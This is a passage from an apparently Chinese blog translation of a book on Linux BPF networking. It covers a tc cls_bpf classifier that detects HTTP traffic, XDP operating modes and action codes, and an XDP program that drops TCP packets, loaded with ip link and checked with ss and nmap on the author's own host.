&#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> = <span class="title">data</span> + <span class="title">nh_off</span> + <span class="title">sizeof</span>(*<span class="title">iph</span>);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcph + <span class="number">1</span> &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tcp_hlen = tcph-&gt;doff &lt;&lt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  poffset = ETH_HLEN + ip_hlen + tcp_hlen;</span><br><span class="line">  plength = ip_total_length - ip_hlen - tcp_hlen;</span><br><span class="line">  <span class="keyword">if</span> (plength &gt;= <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> p[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">      p[i] = load_byte(skb, poffset + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *value;</span><br><span class="line">    <span class="keyword">if</span> ((p[<span class="number">0</span>] == <span class="string">'H'</span>) &amp;&amp; (p[<span class="number">1</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">2</span>] == <span class="string">'T'</span>) &amp;&amp; (p[<span class="number">3</span>] == <span class="string">'P'</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>实用Clang编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c classifier.c -o classifier.o</span><br></pre></td></tr></table></figure><p>tc返回码说明</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TC_ACT_OK (0) , will terminate the packet processing  pipeline  and</span><br><span class="line">           allows the packet to proceed</span><br><span class="line">TC_ACT_SHOT (2) , will terminate the packet processing pipeline and</span><br><span class="line">           drops the packet</span><br><span class="line">TC_ACT_UNSPEC (-1) , will use the default action configured from tc</span><br><span class="line">           (similarly as returning -1 from a classifier)</span><br><span class="line">TC_ACT_PIPE (3) , will iterate to the next action, if available</span><br><span class="line">TC_ACT_RECLASSIFY  (1) , will terminate the packet processing pipe-</span><br><span class="line">           line and start classification from the beginning</span><br><span class="line">           else , everything else is an unspecified return code</span><br></pre></td></tr></table></figure><p>现在我们可以在eth0上安装程序。</p><p>第一个命令将替换eth0设备的默认<code>qdisc</code>，第二个命令将我们的<code>cls_bpf</code>分类器加载到<code>ingress</code>的有类<code>qdisc</code>。这意味着我们的程序将处理进入该接口的所有流量。如果我们想处理传出流量，我们需要使用<code>egress qdisc</code>代替：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tc qdisc add dev eth0 handle 0: ingress</span><br><span class="line">tc filter add dev eth0 ingress bpf obj classifier.o flowid 0:</span><br></pre></td></tr></table></figure><p>程序现在已被加载——我们需要向该接口发送一些HTTP流量。直接python起一个服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>之后通过<code>tc</code>获取调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc exec bpf dbg</span><br><span class="line">Running! Hang up with ^C!</span><br><span class="line">             python3-18456 [000] ..s1 283544.114997: 0: Yes! It is HTTP!</span><br><span class="line"> python3-18754 [002] ..s1 283566.008163: 0: Yes! It is HTTP!</span><br></pre></td></tr></table></figure><p>最后通过<code>tc</code>卸载分类器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos tc]# tc qdisc del dev eth0 ingress</span><br></pre></td></tr></table></figure><h4 id="关于act-bpf以及cls-bpf的不同之处的说明"><a href="#关于act-bpf以及cls-bpf的不同之处的说明" class="headerlink" title="关于act_bpf以及cls_bpf的不同之处的说明"></a>关于act_bpf以及cls_bpf的不同之处的说明</h4><p>你可能已经注意到BPF程序存在另一个名为<code>act_bpf</code>的对象。<code>act_bpf</code>是一个动作，而不是分类器。在操作上与分类器有所不同，因为动作是附加到过滤器的对象，因此它不能直接执行过滤，需要流量控制所有数据包。对于此属性，通常最好使用<code>cls_bpf</code>分类器而不是<code>act_bpf</code>操作。</p><h4 id="TC和XDP的区别"><a href="#TC和XDP的区别" class="headerlink" title="TC和XDP的区别"></a>TC和XDP的区别</h4><p>尽管tc的<code>cls_bpf</code>和XDP程序看起来非常相似，但它们却大不相同。XDP程序在进入主内核网络堆栈之前在入口数据路径中较早执行，因此我们的程序无法像tc那样访问套接字缓冲区结构 <code>sk_buff</code>。XDP程序取而代之的是一个称为<code>xdp_buff</code>的不同结构，它是没有元数据的数据包表示。例如，即使在内核代码之前执行，XDP程序也可以有效地丢弃数据包。 与tc程序相比XDP程序只能附加到进入系统的流量。</p><p>你可能会问什么时候使用XDP？答案是，由于XDP程序不包含所有内核丰富的数据结构和元数据的性质，因此更适合OSI模型的1到4层。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>现在你应该很清楚BPF程序对于在网络数据路径的不同级别获得可见性和控制很有用。也已经了解了如何利用它们来过滤数据包，使用生成BPF程序集的高级工具。然后我们将程序加载到网络套接字，最后我们将程序附加到流量控制入口<code>qdisc</code>以使用BPF程序进行流量分类。在本章中，我们还简要讨论了XDP，后续我们会通过扩展 XDP 程序的构建方式、XDP程序的类型以及如何编写和测试它们来完整学习XDP。</p><h2 id="第七章节"><a href="#第七章节" class="headerlink" title="第七章节"></a>第七章节</h2><h3 id="Express-Data-Path"><a href="#Express-Data-Path" class="headerlink" title="Express Data Path"></a>Express Data Path</h3><p>快速数据路径(XDP)是Linux网络数据路径中安全、可编程、高性能、内核集成的数据包处理器，当NIC驱动程序接收到数据包时，它会执行BPF程序。这允许XDP程序在尽可能早的时间点就对接收到的数据包做出决定（丢弃、修改或仅允许）。</p><p>执行点并不是使XDP程序快速运行的唯一方面；其他设计决策在其中也发挥作用：</p><ul><li>使用XDP进行数据包处理时没有内存分配。</li><li>XDP程序仅适用于线性的、未分段的数据包，并且含有数据包的开始和结束指针。</li><li>无法访问完整的数据包元数据，这就是为什么这种程序接收的输入上下文将是<code>xdp_buff</code> 类型，而不是在之前遇到的<code>sk_buff</code>结构。</li><li>因为是eBPF程序，所以XDP程序具有有限的执行时间，其结果是它们的使用在网络管道中具有固定成本。</li></ul><p>谈到XDP时，重要的是要记住它不是内核绕过机制；它旨在与其他内核组件和内部Linux安全模型集成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdp_buff结构用于向使用XDP框架提供的直接数据包访问机制的BPF程序提供数据包上下文。可以将其视为sk_buff的“轻量级”版本。</span><br><span class="line">两者之间的区别在于sk_buff还保留并允许您与数据包的元数据（proto、mark、type）混合，这些元数据仅在网络管道中的更高级别可用。 xdp_buff是早期创建的并且不依赖于其他内核层的事实是使用XDP获取和处理数据包更快的原因之一。 另一个原因是xdp_buff不包含对路由、流量控制挂钩或其他类型的数据包元数据的引用，就像使用sk_buff的程序类型一样。</span><br></pre></td></tr></table></figure><h3 id="XDP程序概述"><a href="#XDP程序概述" class="headerlink" title="XDP程序概述"></a>XDP程序概述</h3><p>从本质上讲，XDP程序所做的是对接收到的数据包做出决定，然后编辑接收到的数据包的内容或仅返回结果代码。结果代码用于以操作的形式确定数据包发生的情况。你可以丢弃这个包，可以把它从同一个接口传输出去，或者可以把它传递给网络栈的其余部分。此外，为了与网络栈协作，XDP程序可以推送和拉取数据包的头部；例如，如果当前内核不支持封装格式或协议，XDP程序可以将其解封装或翻译协议并将结果发送给内核进行处理。</p><p>但是XDP和eBPF之间有什么关联呢？</p><p>事实证明，XDP程序是通过bpf系统调用控制并使用程序类型<code>BPF_PROG_TYPE_XDP</code>加载的。 此外，执行驱动程序挂钩也要执行BPF字节码。</p><p>编写XDP程序时要理解的一个重要概念是它们将运行的上下文也称为操作模式。</p><h4 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h4><p>XDP具有三种操作模式，以适应测试功能、供应商定制硬件以及无需定制硬件的常用构建内核。</p><h5 id="原生XDP"><a href="#原生XDP" class="headerlink" title="原生XDP"></a>原生XDP</h5><p>这是默认模式。在这种模式下，XDP BPF程序直接在网络驱动程序的接收路径之外运行。使用此模式时，请务必检查驱动程序是否支持。 您可以通过对给定内核版本的源代码树执行以下命令来检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cd linux-4.18/</span><br><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG drivers/ </span><br><span class="line">drivers/net/ethernet/broadcom/bnxt/bnxt_xdp.c</span><br><span class="line">    drivers/net/ethernet/cavium/thunder/nicvf_main.c</span><br><span class="line">    drivers/net/ethernet/intel/i40e/i40e_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbe/ixgbe_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbevf/ixgbevf_main.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx4/en_netdev.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx5/core/en_main.c</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    drivers/net/ethernet/qlogic/qede/qede_filter.c</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    drivers/net/tun.c</span><br><span class="line">    drivers/net/virtio_net.c</span><br></pre></td></tr></table></figure><p>可以看到，内核 4.18 支持以下内容：</p><ul><li>Broadcom NetXtreme-C/E network driver bnxt</li><li>Caviumthunderxdriver</li><li>Inteli40driver</li><li>Intelixgbeandixgvevfdrivers</li><li>Mellanoxmlx4andmlx5drivers</li><li>Netronome Network Flow Processor</li><li>QLogic qede NIC Driver</li><li>TUN/TAP</li><li>Virtio</li></ul><h5 id="卸载XDP"><a href="#卸载XDP" class="headerlink" title="卸载XDP"></a>卸载XDP</h5><p>在这种模式下，XDP BPF程序直接卸载到NIC中，而不是在主机CPU上执行。 通过将执行从CPU中推开，这种模式比原生XDP具有更高的性能提升。</p><p>通过在源码中查找<code>XDP_SETUP_PROG_HW</code>s来检查<code>4.18</code>中哪些NIC驱动程序支持硬件卸载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG_HW drivers/</span><br><span class="line">include/linux/netdevice.h</span><br><span class="line">    866:    XDP_SETUP_PROG_HW,</span><br><span class="line">    net/core/dev.c</span><br><span class="line">    8001:           xdp.command = XDP_SETUP_PROG_HW;</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    200:    if (bpf-&gt;command == XDP_SETUP_PROG_HW &amp;&amp; !ns-&gt;bpf_xdpoffload_accept) &#123;</span><br><span class="line">    205:    if (bpf-&gt;command == XDP_SETUP_PROG_HW) &#123;</span><br><span class="line">    560:    case XDP_SETUP_PROG_HW:</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    3476:   case XDP_SETUP_PROG_HW:</span><br></pre></td></tr></table></figure><p>这仅显示了<code>Netronome</code>网络流处理器(nfp)，意味着它还可以通过支持硬件卸载和本机XDP两种模式运行。</p><p>如果我没有网卡和驱动程序来尝试我的XDP程序时，我该怎么办？ 答案很简单，通用XDP！</p><h5 id="通用XDP"><a href="#通用XDP" class="headerlink" title="通用XDP"></a>通用XDP</h5><p>这是为想要编写和运行XDP程序但不具备本机或卸载XDP功能的开发人员提供的一种测试模式。从内核版本<code>4.12</code>开始支持通用XDP。例如可以在<code>veth</code>设备上使用此模式而无需购买特定的硬件来跟随。</p><p>但是谁是负责协调所有组件和操作模式的参与者呢？ 下一节我们将学习数据包处理器。</p><h4 id="数据包处理器"><a href="#数据包处理器" class="headerlink" title="数据包处理器"></a>数据包处理器</h4><p>XDP数据包处理器可以在XDP数据包上执行BPF程序并协调它们与网络堆栈之间的交互。数据包处理器是XDP程序的内核组件，它直接处理接收(RX)队列上的数据包，因为它们由NIC呈现。它确保数据包是可读和可写的，并允许以数据包处理器操作的形式附加后处理判决。可以在运行时完成对数据包处理器的原子程序更新和新程序加载，而不会在网络和相关流量方面造成任何服务中断。在运行时，XDP可以在“忙轮询”模式下使用，允许保留必须处理每个RX队列的CPU；这避免了上下文切换，并允许在到达时立即响应数据包，而不管IRQ亲缘关系如何。 XDP可以使用的另一种模式是“中断驱动”模式，另一方面，它不保留CPU，而是作为事件媒介的中断通知CPU必须处理新事件，同时仍可以做正常的处理。</p><p>在下图中可以看到RX/TX、应用程序、数据包处理器和应用于数据包的BPF程序之间的交互点。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/4.png" alt="4"></p><p>请注意在上图中有几个带有<code>XDP_</code>前缀的字符串方块。 这些是我们接下来介绍的XDP结果代码。</p><h5 id="XDP结果代码（数据包处理器操作）"><a href="#XDP结果代码（数据包处理器操作）" class="headerlink" title="XDP结果代码（数据包处理器操作）"></a>XDP结果代码（数据包处理器操作）</h5><p>在数据包处理器对数据包做出决定后，可以使用五个返回代码之一来表示，然后可以指示网络驱动程序如何处理数据包：</p><ul><li><p>DROP(XDP_DROP)</p><p>丢弃数据包。这发生在驱动程序中最早的RX阶段；丢弃一个数据包只是意味着将它回收到它刚刚“到达”的RX环形队列中。尽早丢弃数据包是缓解拒绝服务(DoS)的关键。这样，丢弃的数据包会使用尽可能少的CPU处理时间和功率。</p></li><li><p>Forward (XDP_TX)</p><p>转发数据包。 这可能发生在数据包被修改之前或之后。转发数据包意味着将接收到的数据包页面弹回它到达的同一个NIC。</p></li><li><p>Redirect (XDP_REDIRECT)</p><p>与<code>XDP_TX</code>类似，它能够传输XDP数据包，但它是通过另一个NIC或<code>BPF cpumap</code>来传输的。在<code>BPF cpumap</code>的情况下，在NIC的接收队列上为XDP服务的CPU可以继续这样做，并将用于处理上层内核堆栈的数据包推送到远程CPU。这类似于<code>XDP_PASS</code>，但XDP BPF程序可以继续为传入的高负载提供服务。</p></li><li><p>Pass（XDP_PASS)</p><p>将数据包传递给正常的网络堆栈进行处理。这相当于没有XDP的默认数据包处理行为。 通过以下两种方式之一完成：</p><ul><li>正常接收分配元数据（sk_buff），将数据包接收到堆栈上，并将数据包引导到另一个 CPU进行处理。 它允许用户空间的原始接口。 这可能发生在数据包被修改之前或之后。</li><li>通用接收卸载(GRO)可以接收大数据包并合并同一连接的数据包。GRO在处理后最终将数据包通过“正常接收”流程。</li></ul></li><li><p>Code error (XDP_ABORTED)</p><p>表示eBPF程序错误并导致数据包被丢弃。 它不是函数式程序应该用作返回码的东西。例如，如果程序除以零，将返回XDP_ABORTED。 XDP_ABORTED的值将始终为零。它通过 <code>trace_xdp_exception</code>跟踪点可以额外监视该跟踪点以检测不当行为。</p></li></ul><p>这些动作代码在<code>linux/bpf.h</code>头文件中表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> xdp_action &#123;</span><br><span class="line">        XDP_ABORTED = <span class="number">0</span>,</span><br><span class="line">        XDP_DROP,</span><br><span class="line">        XDP_PASS,</span><br><span class="line">        XDP_TX,</span><br><span class="line">        XDP_REDIRECT,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为XDP动作决定了不同的行为并且它是一种数据包处理器的内部机制，所以可以查看如下图的简化版本，仅关注返回动作。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/5.png" alt="5"></p><p>XDP程序的一个有趣之处在于，你通常不需要编写加载程序来加载它们。在大多数Linux机器中都有通过ip命令实现的比较好的加载程序。下一节将介绍如何使用它。</p><h4 id="XDP和iproute2作为加载器"><a href="#XDP和iproute2作为加载器" class="headerlink" title="XDP和iproute2作为加载器"></a>XDP和iproute2作为加载器</h4><p><code>iproute2</code>中可用的<code>ip</code>命令能够充当前端来加载编译成ELF文件的XDP程序，并且完全支持映射、映射重定位、尾调用和对象固定。</p><p>因为加载XDP程序可以表示为对现有网络接口的配置，所以加载程序作为<code>ip link</code>命令的一部分实现，该命令用于配置网络设备。</p><p>接下来让我们尝试一个例子</p><p>场景是我们有一个系统，在端口<code>8000</code>上有一个Web服务器，我们希望通过禁止所有 TCP 连接来阻止对其在服务器的面向公众的NIC上的任何页面的访问。</p><p>首先我们可以通过python起一个简单的服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>在网络服务器启动后，它的开放端口将显示在使用<code>ss</code>的开放套接字中。网络服务器绑定到任何接口 *:8000，因此到目前为止，任何可以访问我们公共接口的外部调用者都可以看到它的内容！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process </span><br><span class="line">tcp     LISTEN   0        5                0.0.0.0:8000          0.0.0.0:*       users:(("python3",pid=5210,fd=3))</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">套接字统计信息，终端中的 ss，是一个命令行实用程序，用于调查 Linux 中的网络套接字。 它实际上是netstat 的现代版本，其用户体验类似于 Netstat，这意味着您可以传递相同的参数并获得可比较的结果。</span><br></pre></td></tr></table></figure><p>你可以使用<code>nmap</code>检查远程主机上的开放端口，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 12:45 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8000/tcp open  http-alt</span><br></pre></td></tr></table></figure><p>通过<code>nmap</code>可以看到<code>8000</code>端口，现在我们要封锁该端口</p><p>我们的程序将包含一个名为<code>program.c</code>的源文件，它需要使用IPv4 <code>iphdr</code>和以太网帧<code>ethhdr</code> 标头结构以及协议常量和其他结构。 让我们包含所需的标题，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>包含头文件后，我们可以使用在前面章节中已经遇到的SEC宏，用于声明ELF属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br></pre></td></tr></table></figure><p>现在我们可以声明程序的主入口点<code>myprogram</code>及ELF节名称<code>mysection</code>。 我们的程序将<code>xdp_md</code>结构指针作为输入上下文，它是驱动程序内<code>xdp_buff</code>的BPF等价物。 通过使用它作为上下文，我们定义接下来将使用的变量，例如数据指针、以太网和IP层结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br></pre></td></tr></table></figure><p>因为数据包含以太网帧，我们现在可以从中提取IPv4层。我们还检查IPv4层的偏移量是否不超过整个指针空间，以便能够通过静态验证器。当超出地址空间时，我们会丢弃数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr); </span><br><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line"><span class="keyword">return</span> XDP_DROP; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在所有的验证和设置之后，我们可以实现程序的真正逻辑，它基本上丢弃每个TCP数据包，同时允许其他任何东西：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们的程序就完成了，<code>program.c</code>完整程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步是使用<code>Clang</code>从我们的程序中编译出ELF文件<code>program.o</code>。我们可以在目标机器之外执行此编译步骤，因为<code>BPF ELF</code>二进制文件不依赖于平台，对<code>program.c</code>编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# clang -g -c -O2 -target bpf -c program.c -o program.o</span><br></pre></td></tr></table></figure><p>现在我们可以使用ip实用程序和set命令将<code>program.o</code>加载到公共网络接口eth0上，加载XDP程序的语法很简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# ip link set dev eth0 xdp obj program.o sec 